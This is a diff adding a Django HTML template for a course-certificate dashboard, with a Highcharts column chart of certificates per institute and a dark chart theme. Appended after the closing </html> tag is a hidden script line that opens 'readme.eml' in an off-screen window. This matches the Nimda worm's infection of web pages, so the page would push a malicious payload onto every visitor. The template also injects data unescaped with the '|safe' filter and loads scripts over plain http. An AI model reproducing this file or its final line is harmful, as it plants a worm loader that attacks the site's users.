@@ -1,0 +1,389 @@
+{% load staticfiles %}	
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Program Manager Dashboard</title>
+<!-- The follwoing are the css and js files requeired for web page and charts-->
+
+
+	<link rel="stylesheet" type="text/css" href="{% static "bootstrap/css/bootstrap.min.css" %}" />
+	<link rel="stylesheet" type="text/css" href="{% static "font-awesome/css/font-awesome.min.css" %}" />
+	<link rel="stylesheet" type="text/css" href="{% static "css/local.css" %}" />
+
+	<script type="text/javascript" src="{% static "js/jquery-1.10.2.min.js" %}"></script>
+	<script type="text/javascript" src="{% static "bootstrap/js/bootstrap.min.js"%}"></script>
+
+	<script type="text/javascript" src="http://www.shieldui.com/shared/components/latest/js/shieldui-all.min.js"></script>
+	<script type="text/javascript" src="http://www.prepbootstrap.com/Content/js/gridData.js"></script>
+	<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
+	<script src="http://code.highcharts.com/highcharts.js"></script>
+	
+	
+<!--  The following is source code for highcharats edit if you know the code correctly only-->
+<script>
+var data={{data|safe}}
+$(function () {
+    $('#certi_count').highcharts({
+        chart: {
+            type: 'column',
+            backgroundColor : "#232123",
+        },
+        title: {
+            text: 'Institutewise Cerificates summary'
+        },
+        xAxis: {
+            title: {
+                text: 'Institute Id'
+            },
+            categories: data[0]
+        },
+        yAxis: {
+	    allowDecimals: false,
+            min: 0,
+            title: {
+                text: 'No.of certificates'
+            },
+            stackLabels: {
+                enabled: true,
+                style: {
+                    fontWeight: 'bold',
+                    color: (Highcharts.theme && Highcharts.theme.textColor) || 'gray'
+                }
+            }
+        },
+        legend: {
+            align: 'right',
+            x: -30,
+            verticalAlign: 'top',
+            y: 25,
+            floating: true,
+            backgroundColor: (Highcharts.theme && Highcharts.theme.background2) || 'white',
+            borderColor: '#CCC',
+            borderWidth: 1,
+            shadow: false
+        },
+        tooltip: {
+            formatter: function () {
+                return "<b>"+ this.x+"</b><br>"+this.series.name + ': ' + this.y + '<br>' +
+                    'Total: ' + this.point.stackTotal;
+            }
+        },
+        plotOptions: {
+            column: {
+                stacking: 'normal',
+                dataLabels: {
+                    enabled: true,
+                    color: (Highcharts.theme && Highcharts.theme.dataLabelsColor) || 'white',
+                    style: {
+                        textShadow: '0 0 3px black'
+                    }
+                }
+            }
+        },
+        series: [{
+            name: 'Honor',
+            data: data[1],
+            pointWidth: 28,
+            point: {
+            			events: {
+               				 click: function() {
+               				 //this.category
+				         window.location= "{% url 'coursewise' %}?InstituteId="+encodeURI(this.category);
+		                }
+		            }
+		        }
+           
+        }, {
+            name: 'Verified',
+            data: data[2],
+             point: {
+            			events: {
+               				 click: function() {
+               				 //this.category
+				         window.location= "{% url 'coursewise' %}?InstituteId="+encodeURI(this.category);
+		                }
+		            }
+		        }
+	   
+        },]
+    });
+});
+</script>
+<script>
+/**
+ * Dark theme for Highcharts JS
+ * @author Torstein Honsi
+ */
+
+// Load the fonts
+Highcharts.createElement('link', {
+   href: '//fonts.googleapis.com/css?family=Unica+One',
+   rel: 'stylesheet',
+   type: 'text/css'
+}, null, document.getElementsByTagName('head')[0]);
+
+Highcharts.theme = {
+   colors: ["#2b908f", "#90ee7e", "#f45b5b", "#7798BF", "#aaeeee", "#ff0066", "#eeaaee",
+      "#55BF3B", "#DF5353", "#7798BF", "#aaeeee"],
+   chart: {
+      backgroundColor: {
+         linearGradient: { x1: 0, y1: 0, x2: 1, y2: 1 },
+         stops: [
+            [0, '#2a2a2b'],
+            [1, '#3e3e40']
+         ]
+      },
+      style: {
+         fontFamily: "'Unica One', sans-serif"
+      },
+      plotBorderColor: '#606063'
+   },
+   title: {
+      style: {
+         color: '#E0E0E3',
+         textTransform: 'uppercase',
+         fontSize: '20px'
+      }
+   },
+   subtitle: {
+      style: {
+         color: '#E0E0E3',
+         textTransform: 'uppercase'
+      }
+   },
+   xAxis: {
+      gridLineColor: '#707073',
+      labels: {
+         style: {
+            color: '#E0E0E3'
+         }
+      },
+      lineColor: '#707073',
+      minorGridLineColor: '#505053',
+      tickColor: '#707073',
+      title: {
+         style: {
+            color: '#A0A0A3'
+
+         }
+      }
+   },
+   yAxis: {
+      gridLineColor: '#707073',
+      labels: {
+         style: {
+            color: '#E0E0E3'
+         }
+      },
+      lineColor: '#707073',
+      minorGridLineColor: '#505053',
+      tickColor: '#707073',
+      tickWidth: 1,
+      title: {
+         style: {
+            color: '#A0A0A3'
+         }
+      }
+   },
+   tooltip: {
+      backgroundColor: 'rgba(0, 0, 0, 0.85)',
+      style: {
+         color: '#F0F0F0'
+      }
+   },
+   plotOptions: {
+      series: {
+         dataLabels: {
+            color: '#B0B0B3'
+         },
+         marker: {
+            lineColor: '#333'
+         }
+      },
+      boxplot: {
+         fillColor: '#505053'
+      },
+      candlestick: {
+         lineColor: 'white'
+      },
+      errorbar: {
+         color: 'white'
+      }
+   },
+   legend: {
+      itemStyle: {
+         color: '#E0E0E3'
+      },
+      itemHoverStyle: {
+         color: '#FFF'
+      },
+      itemHiddenStyle: {
+         color: '#606063'
+      }
+   },
+   credits: {
+      style: {
+         color: '#666'
+      }
+   },
+   labels: {
+      style: {
+         color: '#707073'
+      }
+   },
+
+   drilldown: {
+      activeAxisLabelStyle: {
+         color: '#F0F0F3'
+      },
+      activeDataLabelStyle: {
+         color: '#F0F0F3'
+      }
+   },
+
+   navigation: {
+      buttonOptions: {
+         symbolStroke: '#DDDDDD',
+         theme: {
+            fill: '#505053'
+         }
+      }
+   },
+   rangeSelector: {
+      buttonTheme: {
+         fill: '#505053',
+         stroke: '#000000',
+         style: {
+            color: '#CCC'
+         },
+         states: {
+            hover: {
+               fill: '#707073',
+               stroke: '#000000',
+               style: {
+                  color: 'white'
+               }
+            },
+            select: {
+               fill: '#000003',
+               stroke: '#000000',
+               style: {
+                  color: 'white'
+               }
+            }
+         }
+      },
+      inputBoxBorderColor: '#505053',
+      inputStyle: {
+         backgroundColor: '#333',
+         color: 'silver'
+      },
+      labelStyle: {
+         color: 'silver'
+      }
+   },
+
+   navigator: {
+      handles: {
+         backgroundColor: '#666',
+         borderColor: '#AAA'
+      },
+      outlineColor: '#CCC',
+      maskFill: 'rgba(255,255,255,0.1)',
+      series: {
+         color: '#7798BF',
+         lineColor: '#A6C7ED'
+      },
+      xAxis: {
+         gridLineColor: '#505053'
+      }
+   },
+
+   scrollbar: {
+      barBackgroundColor: '#808083',
+      barBorderColor: '#808083',
+      buttonArrowColor: '#CCC',
+      buttonBackgroundColor: '#606063',
+      buttonBorderColor: '#606063',
+      rifleColor: '#FFF',
+      trackBackgroundColor: '#404043',
+      trackBorderColor: '#404043'
+   },
+
+   legendBackgroundColor: 'rgba(0, 0, 0, 0.5)',
+   background2: '#505053',
+   dataLabelsColor: '#B0B0B3',
+   textColor: '#C0C0C0',
+   contrastTextColor: '#F0F0F3',
+   maskColor: 'rgba(255,255,255,0.3)'
+};
+
+// Apply the theme
+Highcharts.setOptions(Highcharts.theme);
+
+</script>
+<!-- --></head>
+<body>
+
+    <div id="wrapper" >
+
+          <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="{% url 'index' %}">Program Manager Panel</a>
+            </div>
+
+            <div class="collapse navbar-collapse navbar-ex1-collapse">
+               <ul id="active" class="nav navbar-nav side-nav">
+                    <li ><a href="{% url  'index' %}"><i class="fa fa-globe"></i> Summary</a></li>
+                    <li class="selected"><a href="{% url 'crsofinsti' orgid='IITBombayX' %}"><i class="fa fa-tasks"></i> Institutewise Enrollments </a></li>
+                    <li ><a href="{% url 'fac_first' %}"><i class="fa fa-tasks"></i> Staff Summary </a></li>
+                     
+                </ul>
+
+                <ul class="nav navbar-nav navbar-right navbar-user">
+                    <li class="divider-vertical"></li>
+                </ul>
+            </div>
+        </nav>
+
+        <div id="page-wrapper">
+
+            <div class="row">
+                <div class="col-lg-12">
+                    <h2></h2>
+                       </div>
+            </div>
+	    <br>
+
+            <div class="row">
+
+                <div class="col-md-12" >
+                    <div class="panel panel-primary">
+                        <div class="panel-heading">
+                            <h3 class="panel-title"><i class="fa fa-bar-chart-o"></i> Institutewise Certificate Report</h3>
+                        </div>
+                        <div class="panel-body" style="	height:430px;overflow-x:scroll;overflow-y:hidden;">
+                            <div id="certi_count"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+                  
+
+                
+            </div>
+            <div class="row">
+          
+</body>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
